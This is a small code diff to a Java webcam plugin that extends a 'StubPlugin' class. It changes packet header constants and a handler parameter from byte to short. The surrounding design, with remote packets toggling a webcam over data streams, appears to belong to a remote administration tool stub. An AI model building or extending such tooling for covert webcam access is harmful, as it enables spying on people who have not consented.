@@ -19,8 +19,8 @@ import com.github.sarxos.webcam.Webcam;
 
 public class WebcamPlugin extends StubPlugin {
 
-	public static final byte HEADER = 120;
-	public static final byte LIST_WEBCAM_HEADER = 121;
+	public static final short HEADER = 120;
+	public static final short LIST_WEBCAM_HEADER = 121;
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
@@ -54,7 +54,7 @@ public class WebcamPlugin extends StubPlugin {
 		WebcamPlugin.dos = out;
 	}
 
-	public void onPacket(byte header) throws Exception {
+	public void onPacket(short header) throws Exception {
 		if (header == HEADER) {
 			enabled = dis.readBoolean();
 			int webcam = dis.readInt();
